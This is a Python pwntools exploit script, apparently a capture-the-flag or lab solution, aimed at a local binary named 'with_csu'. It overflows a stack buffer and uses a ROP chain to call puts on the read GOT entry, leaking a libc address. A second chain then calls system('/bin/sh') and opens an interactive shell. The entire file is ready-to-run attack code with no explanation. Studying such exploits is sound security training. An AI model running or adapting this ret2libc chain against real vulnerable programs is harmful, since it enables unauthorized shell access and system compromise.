import sys
import pwn
import struct

sys.path.append('../../MyTools')
import gadgets_info
import conversion

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux'
)

target_info = {
	'exec_path': './with_csu',
	'addr_len': 0x8,
	'libc_info': None,
	'bufvar2stack': 0x40,
	'csu_pop_rdi_ret': 0x400683,
	'elf_read_got': 0x601020,
	'own_puts_addr': 0x4005ee,
	'pop_rdi_ret': 0x0,
	'pop_rdi_len': 0x1,
	'ret_offset': 0x0,
	'bin_sh_str': 0x0,
	'system_func': 0x0,
	'libc_base': 0x0,
	'libc_read_offset': 0x0,
}

'''
stage one ->
	| buffer  | caller rbp | callee return |
	| padding | padding    | rop chain     |
	rop chain: leak libc element address
stage two ->
	| buffer  | caller rbp | callee return |
	| padding | padding    | rop chain     |
	rop chain: get shell
'''

pwn.context.binary = pwn.ELF(target_info['exec_path'])
target_info['libc_info'] = pwn.ELF(target_info['exec_path']).libc

target_info['bin_sh_str'] = target_info['libc_info'].search(b'/bin/sh').__next__()
target_info['system_func'] = target_info['libc_info'].sym['system']
target_info['libc_read_offset'] = target_info['libc_info'].sym['read']

print('[--] tips: may need update new offset')
target_info['pop_rdi_ret'] = gadgets_info.linux_adm64_gadgets['pop_rdi_ret_offset']
target_info['ret_offset'] = target_info['pop_rdi_ret'] + target_info['pop_rdi_len']

payload = b'A' * target_info['bufvar2stack']
payload += b'B' * target_info['addr_len']
payload += pwn.p64(target_info['csu_pop_rdi_ret'])
payload += pwn.p64(target_info['elf_read_got'])
payload += pwn.p64(target_info['own_puts_addr'])

conn = pwn.process(target_info['exec_path'])

ret = conn.recv()
print('[++] receive: {0}'.format(ret))
conn.send(payload)

ret = conn.recv()
ret = int.from_bytes(ret[:-1], byteorder='little')
print('[++] receive: leak libc address = {0}'.format(hex(ret)))
target_info['libc_base'] = ret - target_info['libc_read_offset']
print('[**] libc base address = {0}'.format(hex(target_info['libc_base'])))

payload = payload = b'A' * target_info['bufvar2stack']
payload += b'B' * target_info['addr_len']
payload += pwn.p64(target_info['libc_base'] + target_info['pop_rdi_ret'])
payload += pwn.p64(target_info['libc_base'] + target_info['bin_sh_str'])
payload += pwn.p64(target_info['libc_base'] + target_info['ret_offset'])
payload += pwn.p64(target_info['libc_base'] + target_info['system_func'])
conn.send(payload)

conn.interactive()
